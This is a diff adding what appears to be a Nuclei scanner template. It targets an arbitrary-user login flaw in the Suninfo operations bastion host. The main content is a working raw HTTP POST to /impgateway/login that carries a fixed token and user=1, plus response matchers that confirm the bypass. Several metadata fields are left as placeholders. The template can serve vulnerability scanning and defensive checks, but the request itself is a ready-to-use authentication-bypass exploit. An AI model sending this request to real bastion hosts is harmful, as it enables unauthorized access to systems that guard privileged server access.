@@ -1,0 +1,36 @@
+id: suninfo-login-unauth
+info:
+  name: 上讯运维堡垒机 login 接口任意用户登录
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://vip.bdziyi.com/59493/
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: suninfo,unauth
+
+http:
+  - raw:
+      - |
+        POST /impgateway/login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2702.11 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 45
+        Connection: close
+
+        token=lGLYkKyLa3nxCS9zibpO2g==&user=1
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'main','ACCESS_TOKEN_ERROR')
+        condition: and
